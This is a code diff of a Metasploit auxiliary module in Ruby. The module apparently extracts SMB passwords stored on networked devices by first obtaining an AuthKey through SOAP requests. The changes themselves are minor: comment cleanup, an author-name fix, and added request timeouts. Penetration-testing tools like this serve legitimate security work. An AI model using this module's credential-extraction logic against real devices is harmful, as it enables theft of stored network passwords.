@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Auxiliary
       },
       'Author'         =>
         [
-          'Deral "Percentx" Heiland',
+          'Deral "Percent_x" Heiland',
           'Pete "Bokojan" Arzamendi'
         ],
       'License'        => MSF_LICENSE
@@ -38,13 +38,10 @@ class Metasploit3 < Msf::Auxiliary
 
       ], self.class)
   end
-#-----------------------------------------------------------------------------------------------
 
 # start the train wreck
 
-
-##############################################################################
- # Creates the XML data to be sent that will extract AuthKey
+# Creates the XML data to be sent that will extract AuthKey
   def generate_authkey_request_xlm()
     user = datastore['USER']
     passwd = datastore['PASSWD']
@@ -78,8 +75,8 @@ class Metasploit3 < Msf::Auxiliary
     xmlauthreq << "</SOAP-ENV:Envelope>"
     return xmlauthreq
   end
-############################################################################################
-#  Create XML data that will be sent to extract SMB passwords for devices
+
+# Create XML data that will be sent to extract SMB passwords for devices
   def generate_smbpwd_request_xlm()
     xmlsmbreq = "<SOAP-ENV:Envelope"
     xmlsmbreq << "\nxmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'"
@@ -135,14 +132,13 @@ class Metasploit3 < Msf::Auxiliary
         'uri'    => "#{$uri}",
         'method' => 'POST',
         'data'   => "<SOAP-ENV:Envelope></SOAP-ENV:Envelope>"
-        })
+        },datastore['TIMEOUT'].to_i)
       xml0_body= ::Nokogiri::XML(response.body)
       major_parse = xml0_body.xpath("//Major").text
       minor_parse = xml0_body.xpath("//Minor").text
       $major = ("#{major_parse}")
       $minor = ("#{minor_parse}")
       #print_good("#{$major}")
-      #print_good("#{$minor}")
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
     print_error("#{rhost} - Version check Connection failed.")
@@ -162,7 +158,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'    => "#{$uri}",
         'method' => 'POST',
         'data'   => "#{authreq_xml}"
-        })
+        },datastore['TIMEOUT'].to_i)
       xml1_body= ::Nokogiri::XML(response.body)
       authkey_parse = xml1_body.xpath("//AuthKey").text
       #print_good("AuthKey= #{authkey_parse}")
@@ -188,7 +184,7 @@ class Metasploit3 < Msf::Auxiliary
           'uri'    => "#{$uri}",
           'method' => 'POST',
           'data'   => "#{smbreq_xml}"
-          })
+          },datastore['TIMEOUT'].to_i)
         xml2_body = ::Nokogiri::XML(response.body)
         @user_data = xml2_body.xpath("//User").map do |val|
         val.text
